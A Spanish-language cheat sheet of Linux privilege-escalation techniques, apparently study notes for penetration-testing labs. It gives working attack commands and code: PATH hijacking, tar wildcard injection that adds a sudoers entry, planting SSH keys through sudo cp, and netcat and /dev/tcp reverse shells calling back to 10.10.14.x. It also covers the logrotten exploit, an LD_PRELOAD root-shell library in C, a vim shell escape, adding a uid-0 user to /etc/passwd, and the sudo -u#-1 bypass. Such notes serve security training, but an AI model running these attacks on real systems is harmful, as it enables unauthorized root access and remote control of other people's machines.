### Explotación de SUID/GUID

buscar suid files:

    find / -perm -u=s -type f 2>/dev/null

Buscamos en gtfobins explotaciones conocidas:

    https://gtfobins.github.io/

---

### Path Abuse

Podemos aprovecharlo para inyectar archivos maliciosos en una cadena de ejecución. El path tiene un orden y en ese mismo orden el sistema buscará los distintos binarios que necesite para la ejecución.
##### EJ:

Imaginemos un fichero que necesita correr el binario "ECHO" durante su ejecución, al momendo de llamarlo, buscará a lo largo de los directorios de la variable de entorno PATH hasta encontrarlo y ejecutarlo.
De esta manera, si nosotros creamos en un directorio controlado por nosotros un archivo con un código malicioso y lo llamamos ECHO, agregamos este directorio al PATH en un lugar anterior al lugar del path donde 
el verdadero ECHO existe, la computadora lo ejecutará.


#### 1) Buscamos una carpeta donde tengamos permiso de escritura
#### 2) creamos el archivo malicioso
#### 3)Agregamos la dirección al path

    PATH=/<directory>:${PATH}
    export PATH

---
### Cronjob abuse:

Los cron jobs son tareas rutinarias que se corren cada X tiempo de manera automática.
Los cronjobs corren con permisos de root. Si uno de los archivos corridos tiene permiso de escritura, entonces podemos modificarlo para que, al ser corrido, podamos escalar privilegios.
##### Identificar los archivos con permisos de escritura:
        find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

##### Luego podemos imprimir el crontab para ver si alguno de estos archivos aparece:
        cat /etc/crontab

##### De no aparecer ningún archivo, podemos usar pspy para ver los eventos que pasan en el sistema y constatar si alguno está corriendo de manera reiterada:

        ./pspy64 -pf -i 1000

---

### CP impersonation

Si tenemos el privilegio de correr el binario cp como otro usuario podemos aprovecharlo para generar una id_rsa para poder loguearnos por SSH con ese usuario.

##### 1) creamos una id_rsa en nuestra carpeta ssh

    ssh-keygen
##### 2) Damos permisos totales a la id_rsa.pub

    chmod 777 id_rsa.pub
##### 3) Copiamos el archivo .pub a un carpeta dentro de nuestro directorio que no esté restringida como ssh
##### 4) sudo -u <user> /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
##### 5) Nos transferimos la id_rsa de nuestro directorio ssh
##### 6) Nos logueamos mediante ssh con el user a impersonar y la id_rsa
---

### Abusing WGET privileges:

    https://vk9-sec.com/wget-privilege-escalation/
    
----

### WILDCARd ABUSE:

cuando nos encontramos un fichero en el cron que ejecuta en base a un wildcard en una carpeta, podemos sumar ficheros y ordenes de ejecución maliciosas.

##### Ej:
Supongamos que en el cronjob nos encontramos un proceso que corre automáticamente guardando un backup con un wildcard:

tar czf /tmp/backup.tar.gz *

Si tenemos permisos sobre la carpeta en la que está generando el backup, podríamos insertar lo siguiente y esperar que corra para que lo ejecute con permisos de sudo:

        echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
        echo "" > "--checkpoint-action=exec=sh root.sh"
        echo "" > --checkpoint=1


---

### SUDO RIGHTS
Es cuando podemos correr files con otro usuario sin password 

lo llamamos con:
        sudo -l
#### TCPDUMP:
Podemos alcanzar una shell reversa con tcpdump
##### 1) Creamos una reverse shell en alguna carpeta donde podamos escribir
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

##### 2) Iniciamos un netcat
##### 3)Lo ejecutamos desde tcpdump

        sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root


---

### Logrotate

Logrotate se encarga de reemplazar logs antiguos por nuevos de manera automática para no generar ficheros interminables y pesados. Cuando el log a se vuelve muy grande, log rotate crea el log a.1 como contunuación del mismo.

Para poder explotarlo se necesitan 3 cosas:

- Necesitamos permiso de escritura sobre los logs
- Logrotate debe correr como root
- Que se encuentre entre las versiones: 3.8.6,  3.11.0, 3.15.0, 3.18.0

##### A) ver versión de logrotate

        logrotate --version
##### B)Buscar logs sobre los que tengamos permisos

        find / -type f -name "*.log" -exec test -w {} \; -print 2>/dev/null

##### c) Hacemos llegar el exploit a la pc victima

        https://github.com/whotwagner/logrotten

##### D) lo compilamos:
        gcc logrotten.c -o logrotten

##### E) Creamos un Payload que busquemos ejecutar:

        echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

##### F) Iniciamos un nc
##### G) Vemos en qupe está seteado el logrotate.conf

        grep "create\|compress" /etc/logrotate.conf | grep -v "#"

##### H)Corremos el exploit
Si el logrotate.cfg está seteado en crear:

        ./logrotten -p ./payload /tmp/tmp.log

Si el log rotate está seteado en compress:

        ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
        
##### I)Abusamos del log con permiso de escritura para que logrotate corra y el exploit haga su magia.

        
---

### LD_PRELOAD EXPLOITATION

Supongamos que podemos correr con permisos de root un pero no hay un GTFObins para explotarlo. Podemos interntar con LD_PRELOAD.
LD_PRELOAD es una variable de entorno que puede cargar una librería antes de ejecutar un binario.

##### 1)Creamos una librería en c

        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>
        
        void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
        }

##### 2)Compilamos la librería

        gcc -fPIC -shared -o root.so root.c -nostartfiles

##### 3)llamamos al binario sobre el que tenemos permisos de sudo anteponiendo la carga de nuestra librería

        
        sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

---

### Abusing VIM privileges:

Si tenemos permisos de correr vim como otro usuario podemos aprovechar vim para obtener una shell con dicho user (también sirve para escaparse de entornos restringidos)

    sudo -u <user> vim

Una vez abierto:

    :!sh

---

### explotar el /etc/passwd reescribible:

si el passwd file es reescribible por un user del que tenemos control, podemos crear un nuevo root

##### 1)antes de agregar un user, se crea un hash con un salt

    openssl passwd -1 -salt [salt] [password]

##### 2)agregamos el user al listado del passwd:

    username:passwordhash:0:0:root:/root:/bin/bash

### Impersonating restricted SUDO

SI tenemos permiso para correr un archivo como cualquier usuario menos como root y la version de SUDO es 1.8.27 podríamos obligarlo a correr una bash como root usando el siguiente código:

    sudo -u#-1 /bin/bash
